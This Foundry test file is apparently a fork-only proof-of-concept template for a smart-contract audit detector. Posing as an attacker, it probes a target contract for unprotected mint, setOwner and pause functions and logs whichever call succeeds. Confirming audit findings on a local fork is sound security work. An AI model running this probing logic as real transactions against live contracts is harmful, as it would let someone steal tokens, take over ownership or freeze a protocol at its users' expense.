// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import {Test, console} from "forge-std/Test.sol";

/// @title Fallback PoC -- Unprotected privileged function
/// @notice Detector: unprotected-admin. A privileged function (mint, set
///         owner, pause, ...) has no access check, so ANY caller can use
///         it. Tries mint / setOwner / pause in turn; each attempt must
///         change observable state to count as proof.
/// @dev FORK-ONLY. Copy to foundry/test/Exploit.t.sol and run via
///      scripts/run-fork-poc.sh. TODO: narrow to the target's real
///      privileged function if known.

interface IERC20 {
    function balanceOf(address who) external view returns (uint256);
}

contract PoC is Test {
    address public target;
    uint256 public forkBlock;

    function setUp() public {
        target = vm.envOr("POC_TARGET", address(0));
        require(target != address(0), "POC_TARGET not set");
        forkBlock = vm.envOr("POC_FORK_BLOCK", uint256(0));
        string memory rpc = vm.envOr("POC_RPC_URL", string("mainnet"));
        uint256 forkId = forkBlock == 0 ? vm.createFork(rpc) : vm.createFork(rpc, forkBlock);
        vm.selectFork(forkId);
    }

    function test_forkSanity() public {
        assertGt(target.code.length, 0, "target has no code at this fork block");
    }

    function _readOwner() internal view returns (bool found, address owner_) {
        (bool ok, bytes memory ret) = target.staticcall(abi.encodeWithSignature("owner()"));
        if (ok && ret.length == 32) return (true, abi.decode(ret, (address)));
        return (false, address(0));
    }

    function test_exploit() public {
        address attackerEOA = makeAddr("attacker");
        vm.deal(attackerEOA, 1 ether);

        // Attempt 1: mint tokens to the attacker.
        vm.prank(attackerEOA);
        (bool mintOk,) = target.call(
            abi.encodeWithSignature("mint(address,uint256)", attackerEOA, 1000 ether)
        );
        if (mintOk) {
            (bool balOk, bytes memory ret) =
                target.staticcall(abi.encodeWithSignature("balanceOf(address)", attackerEOA));
            if (balOk && abi.decode(ret, (uint256)) >= 1000 ether) {
                console.log("proved via unprotected mint");
                return;
            }
        }

        // Attempt 2: take ownership.
        vm.prank(attackerEOA);
        (bool ownerOk,) = target.call(
            abi.encodeWithSignature("setOwner(address)", attackerEOA)
        );
        if (ownerOk) {
            (bool found, address owner_) = _readOwner();
            if (found && owner_ == attackerEOA) {
                console.log("proved via unprotected setOwner");
                return;
            }
        }

        // Attempt 3: pause the contract.
        vm.prank(attackerEOA);
        (bool pauseOk,) = target.call(abi.encodeWithSignature("pause()"));
        if (pauseOk) {
            (bool pausedOk, bytes memory ret) =
                target.staticcall(abi.encodeWithSignature("paused()"));
            if (pausedOk && abi.decode(ret, (bool))) {
                console.log("proved via unprotected pause");
                return;
            }
        }

        revert("exploit did not reproduce: no privileged function was callable by anyone");
    }
}
